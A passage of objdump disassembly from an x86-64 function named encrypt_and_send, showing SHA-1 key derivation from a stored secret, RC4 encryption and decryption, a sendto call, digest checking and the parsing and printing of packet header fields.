  4018b5:	48 63 c1             	movslq %ecx,%rax
  4018b8:	88 94 05 40 df ff ff 	mov    %dl,-0x20c0(%rbp,%rax,1)
  4018bf:	8b 85 50 da ff ff    	mov    -0x25b0(%rbp),%eax
  4018c5:	48 98                	cltq   
  4018c7:	8b 95 40 da ff ff    	mov    -0x25c0(%rbp),%edx
  4018cd:	48 63 d2             	movslq %edx,%rdx
  4018d0:	48 8d 4a 60          	lea    0x60(%rdx),%rcx
  4018d4:	48 8b 95 30 da ff ff 	mov    -0x25d0(%rbp),%rdx
  4018db:	48 01 ca             	add    %rcx,%rdx
  4018de:	48 8d 72 04          	lea    0x4(%rdx),%rsi
  4018e2:	8b 95 4c da ff ff    	mov    -0x25b4(%rbp),%edx
  4018e8:	8b 8d 48 da ff ff    	mov    -0x25b8(%rbp),%ecx
  4018ee:	01 ca                	add    %ecx,%edx
  4018f0:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  4018f7:	48 63 d2             	movslq %edx,%rdx
  4018fa:	48 01 d1             	add    %rdx,%rcx
  4018fd:	48 89 c2             	mov    %rax,%rdx
  401900:	48 89 cf             	mov    %rcx,%rdi
  401903:	e8 58 f6 ff ff       	callq  400f60 <memcpy@plt>
  401908:	8b 85 50 da ff ff    	mov    -0x25b0(%rbp),%eax
  40190e:	01 85 4c da ff ff    	add    %eax,-0x25b4(%rbp)
  401914:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  40191b:	48 89 c7             	mov    %rax,%rdi
  40191e:	e8 f5 16 00 00       	callq  403018 <sha1_starts>
  401923:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401929:	48 63 d0             	movslq %eax,%rdx
  40192c:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401933:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401939:	48 98                	cltq   
  40193b:	48 01 c1             	add    %rax,%rcx
  40193e:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401945:	48 89 ce             	mov    %rcx,%rsi
  401948:	48 89 c7             	mov    %rax,%rdi
  40194b:	e8 9e 58 00 00       	callq  4071ee <sha1_update>
  401950:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401956:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  40195c:	01 d0                	add    %edx,%eax
  40195e:	48 8d 95 40 df ff ff 	lea    -0x20c0(%rbp),%rdx
  401965:	48 98                	cltq   
  401967:	48 01 c2             	add    %rax,%rdx
  40196a:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401971:	48 89 d6             	mov    %rdx,%rsi
  401974:	48 89 c7             	mov    %rax,%rdi
  401977:	e8 b0 59 00 00       	callq  40732c <sha1_finish>
  40197c:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401982:	48 63 d0             	movslq %eax,%rdx
  401985:	48 8b 0d 04 78 20 00 	mov    0x207804(%rip),%rcx        # 609190 <secret>
  40198c:	48 8d 85 a0 de ff ff 	lea    -0x2160(%rbp),%rax
  401993:	48 89 ce             	mov    %rcx,%rsi
  401996:	48 89 c7             	mov    %rax,%rdi
  401999:	e8 c2 f5 ff ff       	callq  400f60 <memcpy@plt>
  40199e:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  4019a4:	48 63 d0             	movslq %eax,%rdx
  4019a7:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  4019ad:	48 98                	cltq   
  4019af:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  4019b6:	48 01 c1             	add    %rax,%rcx
  4019b9:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  4019c0:	48 89 c6             	mov    %rax,%rsi
  4019c3:	48 89 cf             	mov    %rcx,%rdi
  4019c6:	e8 95 f5 ff ff       	callq  400f60 <memcpy@plt>
  4019cb:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  4019d2:	48 89 c7             	mov    %rax,%rdi
  4019d5:	e8 3e 16 00 00       	callq  403018 <sha1_starts>
  4019da:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  4019e1:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  4019e8:	ba 20 00 00 00       	mov    $0x20,%edx
  4019ed:	48 89 ce             	mov    %rcx,%rsi
  4019f0:	48 89 c7             	mov    %rax,%rdi
  4019f3:	e8 f6 57 00 00       	callq  4071ee <sha1_update>
  4019f8:	48 8d 95 a0 de ff ff 	lea    -0x2160(%rbp),%rdx
  4019ff:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401a06:	48 89 d6             	mov    %rdx,%rsi
  401a09:	48 89 c7             	mov    %rax,%rdi
  401a0c:	e8 1b 59 00 00       	callq  40732c <sha1_finish>
  401a11:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401a18:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401a1f:	ba 14 00 00 00       	mov    $0x14,%edx
  401a24:	48 89 ce             	mov    %rcx,%rsi
  401a27:	48 89 c7             	mov    %rax,%rdi
  401a2a:	e8 ae 5b 00 00       	callq  4075dd <rc4_setup>
  401a2f:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401a35:	8d 50 14             	lea    0x14(%rax),%edx
  401a38:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401a3e:	48 98                	cltq   
  401a40:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401a47:	48 01 c1             	add    %rax,%rcx
  401a4a:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401a51:	48 89 ce             	mov    %rcx,%rsi
  401a54:	48 89 c7             	mov    %rax,%rdi
  401a57:	e8 a0 5c 00 00       	callq  4076fc <rc4_crypt>
  401a5c:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  401a63:	48 8d 48 04          	lea    0x4(%rax),%rcx
  401a67:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401a6d:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401a73:	01 d0                	add    %edx,%eax
  401a75:	83 c0 14             	add    $0x14,%eax
  401a78:	48 63 d0             	movslq %eax,%rdx
  401a7b:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  401a82:	8b 00                	mov    (%rax),%eax
  401a84:	48 8d b5 40 df ff ff 	lea    -0x20c0(%rbp),%rsi
  401a8b:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  401a91:	49 89 c8             	mov    %rcx,%r8
  401a94:	b9 00 00 00 00       	mov    $0x0,%ecx
  401a99:	89 c7                	mov    %eax,%edi
  401a9b:	e8 30 f4 ff ff       	callq  400ed0 <sendto@plt>
  401aa0:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401aa6:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401aac:	01 d0                	add    %edx,%eax
  401aae:	83 c0 14             	add    $0x14,%eax
  401ab1:	89 85 54 da ff ff    	mov    %eax,-0x25ac(%rbp)
  401ab7:	bf 7b 79 40 00       	mov    $0x40797b,%edi
  401abc:	e8 2f f3 ff ff       	callq  400df0 <puts@plt>
  401ac1:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401ac8:	48 8b 00             	mov    (%rax),%rax
  401acb:	89 c6                	mov    %eax,%esi
  401acd:	bf 8c 79 40 00       	mov    $0x40798c,%edi
  401ad2:	b8 00 00 00 00       	mov    $0x0,%eax
  401ad7:	e8 94 f3 ff ff       	callq  400e70 <printf@plt>
  401adc:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401ae3:	48 8b 40 08          	mov    0x8(%rax),%rax
  401ae7:	89 c6                	mov    %eax,%esi
  401ae9:	bf 9b 79 40 00       	mov    $0x40799b,%edi
  401aee:	b8 00 00 00 00       	mov    $0x0,%eax
  401af3:	e8 78 f3 ff ff       	callq  400e70 <printf@plt>
  401af8:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401aff:	8b 40 54             	mov    0x54(%rax),%eax
  401b02:	89 c6                	mov    %eax,%esi
  401b04:	bf aa 79 40 00       	mov    $0x4079aa,%edi
  401b09:	b8 00 00 00 00       	mov    $0x0,%eax
  401b0e:	e8 5d f3 ff ff       	callq  400e70 <printf@plt>
  401b13:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401b1a:	8b 40 58             	mov    0x58(%rax),%eax
  401b1d:	89 c6                	mov    %eax,%esi
  401b1f:	bf b9 79 40 00       	mov    $0x4079b9,%edi
  401b24:	b8 00 00 00 00       	mov    $0x0,%eax
  401b29:	e8 42 f3 ff ff       	callq  400e70 <printf@plt>
  401b2e:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401b35:	8b 40 5c             	mov    0x5c(%rax),%eax
  401b38:	89 c6                	mov    %eax,%esi
  401b3a:	bf c8 79 40 00       	mov    $0x4079c8,%edi
  401b3f:	b8 00 00 00 00       	mov    $0x0,%eax
  401b44:	e8 27 f3 ff ff       	callq  400e70 <printf@plt>
  401b49:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  401b50:	8b 40 60             	mov    0x60(%rax),%eax
  401b53:	89 c6                	mov    %eax,%esi
  401b55:	bf d7 79 40 00       	mov    $0x4079d7,%edi
  401b5a:	b8 00 00 00 00       	mov    $0x0,%eax
  401b5f:	e8 0c f3 ff ff       	callq  400e70 <printf@plt>
  401b64:	bf e6 79 40 00       	mov    $0x4079e6,%edi
  401b69:	e8 82 f2 ff ff       	callq  400df0 <puts@plt>
  401b6e:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  401b74:	48 63 d0             	movslq %eax,%rdx
  401b77:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  401b7e:	be 00 00 00 00       	mov    $0x0,%esi
  401b83:	48 89 c7             	mov    %rax,%rdi
  401b86:	e8 ff 0f 00 00       	callq  402b8a <__print_output>
  401b8b:	bf f2 79 40 00       	mov    $0x4079f2,%edi
  401b90:	e8 5b f2 ff ff       	callq  400df0 <puts@plt>
  401b95:	8b 85 54 da ff ff    	mov    -0x25ac(%rbp),%eax
  401b9b:	48 63 d0             	movslq %eax,%rdx
  401b9e:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401ba5:	be 00 00 00 00       	mov    $0x0,%esi
  401baa:	48 89 c7             	mov    %rax,%rdi
  401bad:	e8 d8 0f 00 00       	callq  402b8a <__print_output>
  401bb2:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401bb8:	48 63 d0             	movslq %eax,%rdx
  401bbb:	48 8b 0d ce 75 20 00 	mov    0x2075ce(%rip),%rcx        # 609190 <secret>
  401bc2:	48 8d 85 a0 de ff ff 	lea    -0x2160(%rbp),%rax
  401bc9:	48 89 ce             	mov    %rcx,%rsi
  401bcc:	48 89 c7             	mov    %rax,%rdi
  401bcf:	e8 8c f3 ff ff       	callq  400f60 <memcpy@plt>
  401bd4:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401bda:	48 63 d0             	movslq %eax,%rdx
  401bdd:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401be3:	48 98                	cltq   
  401be5:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401bec:	48 01 c1             	add    %rax,%rcx
  401bef:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401bf6:	48 89 c6             	mov    %rax,%rsi
  401bf9:	48 89 cf             	mov    %rcx,%rdi
  401bfc:	e8 5f f3 ff ff       	callq  400f60 <memcpy@plt>
  401c01:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c08:	48 89 c7             	mov    %rax,%rdi
  401c0b:	e8 08 14 00 00       	callq  403018 <sha1_starts>
  401c10:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401c17:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c1e:	ba 20 00 00 00       	mov    $0x20,%edx
  401c23:	48 89 ce             	mov    %rcx,%rsi
  401c26:	48 89 c7             	mov    %rax,%rdi
  401c29:	e8 c0 55 00 00       	callq  4071ee <sha1_update>
  401c2e:	48 8d 95 a0 de ff ff 	lea    -0x2160(%rbp),%rdx
  401c35:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c3c:	48 89 d6             	mov    %rdx,%rsi
  401c3f:	48 89 c7             	mov    %rax,%rdi
  401c42:	e8 e5 56 00 00       	callq  40732c <sha1_finish>
  401c47:	48 8d 8d a0 de ff ff 	lea    -0x2160(%rbp),%rcx
  401c4e:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401c55:	ba 14 00 00 00       	mov    $0x14,%edx
  401c5a:	48 89 ce             	mov    %rcx,%rsi
  401c5d:	48 89 c7             	mov    %rax,%rdi
  401c60:	e8 78 59 00 00       	callq  4075dd <rc4_setup>
  401c65:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401c6b:	8d 50 14             	lea    0x14(%rax),%edx
  401c6e:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401c74:	48 98                	cltq   
  401c76:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401c7d:	48 01 c1             	add    %rax,%rcx
  401c80:	48 8d 85 60 da ff ff 	lea    -0x25a0(%rbp),%rax
  401c87:	48 89 ce             	mov    %rcx,%rsi
  401c8a:	48 89 c7             	mov    %rax,%rdi
  401c8d:	e8 6a 5a 00 00       	callq  4076fc <rc4_crypt>
  401c92:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401c99:	48 89 c7             	mov    %rax,%rdi
  401c9c:	e8 77 13 00 00       	callq  403018 <sha1_starts>
  401ca1:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401ca7:	48 63 d0             	movslq %eax,%rdx
  401caa:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401cb0:	48 98                	cltq   
  401cb2:	48 8d 8d 40 df ff ff 	lea    -0x20c0(%rbp),%rcx
  401cb9:	48 01 c1             	add    %rax,%rcx
  401cbc:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401cc3:	48 89 ce             	mov    %rcx,%rsi
  401cc6:	48 89 c7             	mov    %rax,%rdi
  401cc9:	e8 20 55 00 00       	callq  4071ee <sha1_update>
  401cce:	48 8d 95 80 de ff ff 	lea    -0x2180(%rbp),%rdx
  401cd5:	48 8d 85 c0 de ff ff 	lea    -0x2140(%rbp),%rax
  401cdc:	48 89 d6             	mov    %rdx,%rsi
  401cdf:	48 89 c7             	mov    %rax,%rdi
  401ce2:	e8 45 56 00 00       	callq  40732c <sha1_finish>
  401ce7:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401ced:	48 63 d0             	movslq %eax,%rdx
  401cf0:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401cf6:	48 98                	cltq   
  401cf8:	48 01 c2             	add    %rax,%rdx
  401cfb:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401d02:	48 8d 0c 10          	lea    (%rax,%rdx,1),%rcx
  401d06:	48 8d 85 80 de ff ff 	lea    -0x2180(%rbp),%rax
  401d0d:	ba 14 00 00 00       	mov    $0x14,%edx
  401d12:	48 89 ce             	mov    %rcx,%rsi
  401d15:	48 89 c7             	mov    %rax,%rdi
  401d18:	e8 13 f2 ff ff       	callq  400f30 <memcmp@plt>
  401d1d:	85 c0                	test   %eax,%eax
  401d1f:	74 4b                	je     401d6c <encrypt_and_send+0x7d0>
  401d21:	48 8d 85 70 de ff ff 	lea    -0x2190(%rbp),%rax
  401d28:	48 89 c7             	mov    %rax,%rdi
  401d2b:	e8 55 0f 00 00       	callq  402c85 <pretty_time>
  401d30:	48 8d 85 70 de ff ff 	lea    -0x2190(%rbp),%rax
  401d37:	48 89 c2             	mov    %rax,%rdx
  401d3a:	be c1 78 40 00       	mov    $0x4078c1,%esi
  401d3f:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  401d44:	b8 00 00 00 00       	mov    $0x0,%eax
  401d49:	e8 22 f1 ff ff       	callq  400e70 <printf@plt>
  401d4e:	be a0 7b 40 00       	mov    $0x407ba0,%esi
  401d53:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  401d58:	b8 00 00 00 00       	mov    $0x0,%eax
  401d5d:	e8 0e f1 ff ff       	callq  400e70 <printf@plt>
  401d62:	bf 00 7a 40 00       	mov    $0x407a00,%edi
  401d67:	e8 84 f0 ff ff       	callq  400df0 <puts@plt>
  401d6c:	c7 85 4c da ff ff 00 	movl   $0x0,-0x25b4(%rbp)
  401d73:	00 00 00 
  401d76:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401d7c:	8d 50 01             	lea    0x1(%rax),%edx
  401d7f:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401d85:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401d8b:	01 d0                	add    %edx,%eax
  401d8d:	48 98                	cltq   
  401d8f:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401d96:	ff 
  401d97:	0f b6 c8             	movzbl %al,%ecx
  401d9a:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401da0:	8d 50 01             	lea    0x1(%rax),%edx
  401da3:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401da9:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401daf:	01 d0                	add    %edx,%eax
  401db1:	48 98                	cltq   
  401db3:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401dba:	ff 
  401dbb:	0f b6 c0             	movzbl %al,%eax
  401dbe:	c1 e0 08             	shl    $0x8,%eax
  401dc1:	09 c1                	or     %eax,%ecx
  401dc3:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401dc9:	8d 50 01             	lea    0x1(%rax),%edx
  401dcc:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401dd2:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401dd8:	01 d0                	add    %edx,%eax
  401dda:	48 98                	cltq   
  401ddc:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401de3:	ff 
  401de4:	0f b6 c0             	movzbl %al,%eax
  401de7:	c1 e0 10             	shl    $0x10,%eax
  401dea:	09 c1                	or     %eax,%ecx
  401dec:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401df2:	8d 50 01             	lea    0x1(%rax),%edx
  401df5:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401dfb:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e01:	01 d0                	add    %edx,%eax
  401e03:	48 98                	cltq   
  401e05:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e0c:	ff 
  401e0d:	0f b6 c0             	movzbl %al,%eax
  401e10:	c1 e0 18             	shl    $0x18,%eax
  401e13:	09 c8                	or     %ecx,%eax
  401e15:	48 98                	cltq   
  401e17:	48 89 85 80 ef ff ff 	mov    %rax,-0x1080(%rbp)
  401e1e:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e24:	8d 50 01             	lea    0x1(%rax),%edx
  401e27:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401e2d:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e33:	01 d0                	add    %edx,%eax
  401e35:	48 98                	cltq   
  401e37:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e3e:	ff 
  401e3f:	0f b6 c8             	movzbl %al,%ecx
  401e42:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e48:	8d 50 01             	lea    0x1(%rax),%edx
  401e4b:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401e51:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e57:	01 d0                	add    %edx,%eax
  401e59:	48 98                	cltq   
  401e5b:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e62:	ff 
  401e63:	0f b6 c0             	movzbl %al,%eax
  401e66:	c1 e0 08             	shl    $0x8,%eax
  401e69:	09 c1                	or     %eax,%ecx
  401e6b:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e71:	8d 50 01             	lea    0x1(%rax),%edx
  401e74:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401e7a:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401e80:	01 d0                	add    %edx,%eax
  401e82:	48 98                	cltq   
  401e84:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401e8b:	ff 
  401e8c:	0f b6 c0             	movzbl %al,%eax
  401e8f:	c1 e0 10             	shl    $0x10,%eax
  401e92:	09 c1                	or     %eax,%ecx
  401e94:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401e9a:	8d 50 01             	lea    0x1(%rax),%edx
  401e9d:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401ea3:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401ea9:	01 d0                	add    %edx,%eax
  401eab:	48 98                	cltq   
  401ead:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401eb4:	ff 
  401eb5:	0f b6 c0             	movzbl %al,%eax
  401eb8:	c1 e0 18             	shl    $0x18,%eax
  401ebb:	09 c8                	or     %ecx,%eax
  401ebd:	48 98                	cltq   
  401ebf:	48 89 85 88 ef ff ff 	mov    %rax,-0x1078(%rbp)
  401ec6:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401ecc:	8d 50 01             	lea    0x1(%rax),%edx
  401ecf:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401ed5:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401edb:	01 d0                	add    %edx,%eax
  401edd:	48 98                	cltq   
  401edf:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401ee6:	ff 
  401ee7:	0f b6 c8             	movzbl %al,%ecx
  401eea:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401ef0:	8d 50 01             	lea    0x1(%rax),%edx
  401ef3:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401ef9:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401eff:	01 d0                	add    %edx,%eax
  401f01:	48 98                	cltq   
  401f03:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f0a:	ff 
  401f0b:	0f b6 c0             	movzbl %al,%eax
  401f0e:	c1 e0 08             	shl    $0x8,%eax
  401f11:	09 c8                	or     %ecx,%eax
  401f13:	89 85 d4 ef ff ff    	mov    %eax,-0x102c(%rbp)
  401f19:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401f1f:	8d 50 01             	lea    0x1(%rax),%edx
  401f22:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401f28:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401f2e:	01 d0                	add    %edx,%eax
  401f30:	48 98                	cltq   
  401f32:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f39:	ff 
  401f3a:	0f b6 c8             	movzbl %al,%ecx
  401f3d:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401f43:	8d 50 01             	lea    0x1(%rax),%edx
  401f46:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401f4c:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401f52:	01 d0                	add    %edx,%eax
  401f54:	48 98                	cltq   
  401f56:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f5d:	ff 
  401f5e:	0f b6 c0             	movzbl %al,%eax
  401f61:	c1 e0 08             	shl    $0x8,%eax
  401f64:	09 c8                	or     %ecx,%eax
  401f66:	89 85 d8 ef ff ff    	mov    %eax,-0x1028(%rbp)
  401f6c:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401f72:	8d 50 01             	lea    0x1(%rax),%edx
  401f75:	89 95 4c da ff ff    	mov    %edx,-0x25b4(%rbp)
  401f7b:	8b 95 48 da ff ff    	mov    -0x25b8(%rbp),%edx
  401f81:	01 d0                	add    %edx,%eax
  401f83:	48 98                	cltq   
  401f85:	0f b6 84 05 40 df ff 	movzbl -0x20c0(%rbp,%rax,1),%eax
  401f8c:	ff 
  401f8d:	0f b6 c0             	movzbl %al,%eax
  401f90:	89 85 dc ef ff ff    	mov    %eax,-0x1024(%rbp)
  401f96:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401f9c:	8b 95 54 da ff ff    	mov    -0x25ac(%rbp),%edx
  401fa2:	29 c2                	sub    %eax,%edx
  401fa4:	89 d0                	mov    %edx,%eax
  401fa6:	2b 85 4c da ff ff    	sub    -0x25b4(%rbp),%eax
  401fac:	89 85 e0 ef ff ff    	mov    %eax,-0x1020(%rbp)
  401fb2:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  401fb8:	83 c0 01             	add    $0x1,%eax
  401fbb:	48 98                	cltq   
  401fbd:	48 89 c7             	mov    %rax,%rdi
  401fc0:	e8 fb ef ff ff       	callq  400fc0 <malloc@plt>
  401fc5:	48 89 85 58 da ff ff 	mov    %rax,-0x25a8(%rbp)
  401fcc:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  401fd2:	48 63 d0             	movslq %eax,%rdx
  401fd5:	8b 85 4c da ff ff    	mov    -0x25b4(%rbp),%eax
  401fdb:	48 63 c8             	movslq %eax,%rcx
  401fde:	8b 85 48 da ff ff    	mov    -0x25b8(%rbp),%eax
  401fe4:	48 98                	cltq   
  401fe6:	48 01 c1             	add    %rax,%rcx
  401fe9:	48 8d 85 40 df ff ff 	lea    -0x20c0(%rbp),%rax
  401ff0:	48 01 c1             	add    %rax,%rcx
  401ff3:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  401ffa:	48 89 ce             	mov    %rcx,%rsi
  401ffd:	48 89 c7             	mov    %rax,%rdi
  402000:	e8 5b ef ff ff       	callq  400f60 <memcpy@plt>
  402005:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  40200b:	48 63 d0             	movslq %eax,%rdx
  40200e:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  402015:	48 01 d0             	add    %rdx,%rax
  402018:	c6 00 00             	movb   $0x0,(%rax)
  40201b:	bf 23 7a 40 00       	mov    $0x407a23,%edi
  402020:	e8 cb ed ff ff       	callq  400df0 <puts@plt>
  402025:	48 8b 85 80 ef ff ff 	mov    -0x1080(%rbp),%rax
  40202c:	89 c6                	mov    %eax,%esi
  40202e:	bf 8c 79 40 00       	mov    $0x40798c,%edi
  402033:	b8 00 00 00 00       	mov    $0x0,%eax
  402038:	e8 33 ee ff ff       	callq  400e70 <printf@plt>
  40203d:	48 8b 85 88 ef ff ff 	mov    -0x1078(%rbp),%rax
  402044:	89 c6                	mov    %eax,%esi
  402046:	bf 9b 79 40 00       	mov    $0x40799b,%edi
  40204b:	b8 00 00 00 00       	mov    $0x0,%eax
  402050:	e8 1b ee ff ff       	callq  400e70 <printf@plt>
  402055:	8b 85 d4 ef ff ff    	mov    -0x102c(%rbp),%eax
  40205b:	89 c6                	mov    %eax,%esi
  40205d:	bf aa 79 40 00       	mov    $0x4079aa,%edi
  402062:	b8 00 00 00 00       	mov    $0x0,%eax
  402067:	e8 04 ee ff ff       	callq  400e70 <printf@plt>
  40206c:	8b 85 d8 ef ff ff    	mov    -0x1028(%rbp),%eax
  402072:	89 c6                	mov    %eax,%esi
  402074:	bf b9 79 40 00       	mov    $0x4079b9,%edi
  402079:	b8 00 00 00 00       	mov    $0x0,%eax
  40207e:	e8 ed ed ff ff       	callq  400e70 <printf@plt>
  402083:	8b 85 dc ef ff ff    	mov    -0x1024(%rbp),%eax
  402089:	89 c6                	mov    %eax,%esi
  40208b:	bf c8 79 40 00       	mov    $0x4079c8,%edi
  402090:	b8 00 00 00 00       	mov    $0x0,%eax
  402095:	e8 d6 ed ff ff       	callq  400e70 <printf@plt>
  40209a:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  4020a0:	89 c6                	mov    %eax,%esi
  4020a2:	bf d7 79 40 00       	mov    $0x4079d7,%edi
  4020a7:	b8 00 00 00 00       	mov    $0x0,%eax
  4020ac:	e8 bf ed ff ff       	callq  400e70 <printf@plt>
  4020b1:	bf e6 79 40 00       	mov    $0x4079e6,%edi
  4020b6:	e8 35 ed ff ff       	callq  400df0 <puts@plt>
  4020bb:	8b 85 e0 ef ff ff    	mov    -0x1020(%rbp),%eax
  4020c1:	48 63 d0             	movslq %eax,%rdx
  4020c4:	48 8b 85 58 da ff ff 	mov    -0x25a8(%rbp),%rax
  4020cb:	be 00 00 00 00       	mov    $0x0,%esi
